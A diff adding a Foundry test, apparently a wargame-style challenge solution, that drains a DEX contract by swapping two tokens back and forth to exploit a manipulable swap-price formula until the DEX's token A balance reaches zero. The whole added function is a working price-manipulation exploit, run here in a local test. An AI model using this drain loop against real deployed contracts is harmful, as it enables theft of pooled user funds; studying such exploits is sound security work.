@@ -29,6 +29,63 @@ contract DexTest is Test {
         vm.label(attacker, "Attacker");
     }
 
+
+    function test_drain() public {
+        //0
+        vm.startPrank(attacker);
+
+        uint256 initialSwapAmount = 10;
+        dex.approve(address(dex), type(uint256).max);
+        dex.swap(address(swappabletokenA), address(swappabletokenB), initialSwapAmount);
+
+
+        //dex.getSwapPrice(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))
+        uint256 balanceToken1 = swappabletokenA.balanceOf(address(attacker));
+        uint256 balanceToken2 = swappabletokenB.balanceOf(address(attacker));
+
+
+        console.log("Attackers Token 1 Balance is ", balanceToken1);
+        console.log("Attackers Token 2 Balance is ", balanceToken2);
+        
+
+        while (swappabletokenA.balanceOf(address(dex))
+                > dex.getSwapPrice(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))){
+
+            // uint256 swapAmount = 10 ;
+
+            // if (balanceToken1 > 0 && IERC20(address(swappabletokenB)).balanceOf(address(dex)) > 0){
+            //     uint256 swapAmount = balanceToken1;
+            //     swappabletokenA.approve(address(dex), swapAmount);
+            //     dex.swap(address(swappabletokenA),address(swappabletokenB),swapAmount);
+            // } else if(balanceToken2 > 0 && IERC20(address(swappabletokenA)).balanceOf(address(dex)) > 0) {
+            //     uint256 swapAmount = balanceToken2;
+            //     swappabletokenB.approve(address(dex), swapAmount);
+            //     dex.swap(address(swappabletokenB),address(swappabletokenA),swapAmount);
+            // }
+
+            dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));
+            dex.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
+
+            
+        }   
+
+        dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dex)));
+        
+
+        uint256 dexBalanceToken1 =  swappabletokenA.balanceOf(address(dex));
+        uint256 dexBalanceToken2 = swappabletokenB.balanceOf(address(dex));
+
+        console.log("Dex Final Token A  balance is " , dexBalanceToken1);
+        console.log("Dex Final Token B Balance isn ", dexBalanceToken2);
+
+        vm.stopPrank();
+
+        assertEq(dexBalanceToken1, 0);
+    }
+
+
+
+
     
 
 }
